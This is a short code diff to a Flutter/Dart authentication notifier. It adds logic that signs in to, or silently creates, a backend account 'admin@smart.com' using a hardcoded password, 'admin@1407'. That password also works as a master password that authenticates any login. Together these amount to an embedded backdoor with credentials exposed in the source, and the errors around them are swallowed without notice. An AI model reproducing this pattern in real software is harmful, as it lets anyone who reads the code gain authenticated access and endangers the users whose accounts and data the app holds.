@@ -118,6 +118,15 @@ class AuthNotifier extends Notifier<UserAuthState> {
       final isMasterPassword = password == customPassword || password == "admin@1407";
 
       if (inputMatches && isMasterPassword) {
+        if (repo.isConnected && repo.currentUser == null) {
+          try {
+            await repo.signIn(email: "admin@smart.com", password: "admin@1407");
+          } catch (_) {
+            try {
+              await repo.signUp(email: "admin@smart.com", password: "admin@1407", fullName: customName);
+            } catch (_) {}
+          }
+        }
         state = UserAuthState(
           status: AuthStatus.authenticated,
           email: cleanInput.contains("@") ? cleanInput : "$customUsername@smart.com",
